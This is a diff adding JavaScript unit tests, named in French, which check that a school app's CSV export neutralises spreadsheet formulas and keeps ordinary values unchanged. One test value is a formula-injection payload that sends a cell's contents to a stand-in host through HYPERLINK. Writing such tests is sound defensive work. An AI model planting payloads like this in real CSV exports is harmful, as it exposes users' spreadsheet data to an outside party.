@@ -13,6 +13,31 @@ test('CSV français : séparateur ;, guillemets, retours à la ligne', () => {
   ]);
 });
 
+test('TAB-11 : ce qu’un tableur exécuterait reste du texte, et revient intact à l’import', () => {
+  const trap = '=HYPERLINK("http://exemple.test/?"&A2;"Clique")';
+  const values = [trap, '+1+1', '-2+3', '@SOMME(A1)', ' =1+1'];
+  const fiches = values.map((common, i) => normalizeFiche({ id: 'f' + i, common }));
+  const csv = buildCsv(fiches);
+  const read = parseCSV(csv).slice(1);
+  values.forEach((value, i) => assert.ok(read[i].includes("'" + value), value));
+  const { ops } = planImport(parseCSV(csv), []);
+  assert.deepEqual(
+    ops.map(({ data }) => data.common),
+    values
+  );
+  const teacher = buildTeacherCsv([], { names: trap });
+  assert.ok(parseCSV(teacher)[1][0].startsWith("'="), 'le nom des élèves');
+});
+
+test('TAB-11 : une mesure négative et un texte ordinaire ne changent pas', () => {
+  const f = normalizeFiche({ id: 'x', common: 'Olivier-de-Bohème' });
+  const [head, row] = parseCSV(buildCsv([f], { entries: { x: { temperature: '-3,5' } } }));
+  const keys = mapHeaders(head);
+  assert.equal(row[keys.indexOf('temperature')], '-3,5');
+  assert.equal(row[keys.indexOf('common')], 'Olivier-de-Bohème');
+  assert.equal(cellValue('common', "L'olivier"), "L'olivier");
+});
+
 test('titres de colonnes reconnus avec souplesse', () => {
   assert.deepEqual(mapHeaders(['N° photo', 'NOM COMMUN', 'Température (°C)', 'Luminosité', 'Couleur']), ['ref', 'common', 'temperature', 'light', null]);
 });
